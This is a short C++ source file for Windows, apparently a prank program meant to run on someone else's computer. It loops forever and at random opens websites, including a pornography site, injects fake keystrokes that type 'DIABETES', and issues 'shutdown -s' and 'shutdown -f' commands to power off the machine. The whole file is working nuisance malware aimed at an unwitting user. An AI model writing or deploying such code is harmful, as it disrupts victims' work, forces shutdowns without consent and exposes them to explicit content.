#include<cstdlib>
#include<iostream>
#include<ctime>
#define WINVER 0x0500
#include <windows.h>
#include <mmsystem.h>
#include <shell32.h>
using namespace std;

const int ARR_LENGTH = 10;

void sleep(unsigned milliseconds) {
        Sleep(milliseconds * 1000);
}


int main() {

	char chaPhrase[ARR_LENGTH] = "DIABETES";
	
	//Allows reading keyboard
	INPUT keyInput;
	keyInput.type = INPUT_KEYBOARD;
	keyInput.ki.wScan = 0;
	keyInput.ki.time = 0;
	keyInput.ki.dwExtraInfo = 0;

	while (true) {
		
		sleep(900);
		
		
		if (rand() % 25 == 0) {
			// Code to type for him
			int temp = rand() % 4;
			switch (temp) {
				case 0:
					ShellExecute(NULL, "open", "http://www.google.com", NULL, NULL, SW_SHOWDEFAULT);
				break;
				case 1:
					ShellExecute(NULL, "open", "http://www.pornhub.com", NULL, NULL, SW_SHOWDEFAULT);
				break;
				case 3:
					ShellExecute(NULL, "open", "http://www.downloadmoreram.com", NULL, NULL, SW_SHOWDEFAULT);
				break;
				case 2:
					ShellExecute(NULL, "open", "http://www.google.com", NULL, NULL, SW_SHOWDEFAULT);
				break;
			}
			
		} 
		else if (rand() % 100 == 0) {
			// Code to shut down computer
			system("shutdown -s");
		} 
		else if (rand() % 50 == 0) {
			// Code to close programs
			system("shutdown -f");
		}
		else if (rand() % 5 == 0) {
			//Types out chaPhrase array
			for (int i = 0; i < ARR_LENGTH; i++) {
				keyInput.ki.wVk = chaPhrase[i];
				keyInput.ki.dwFlags = 0;
				SendInput(1, &keyInput, sizeof(INPUT));
			}
		
			keyInput.ki.dwFlags = KEYEVENTF_KEYUP;
			SendInput(1, &keyInput, sizeof(INPUT));
		}
		
		
		
		
		
		
		
	} // End While






return 0;
} // End Main
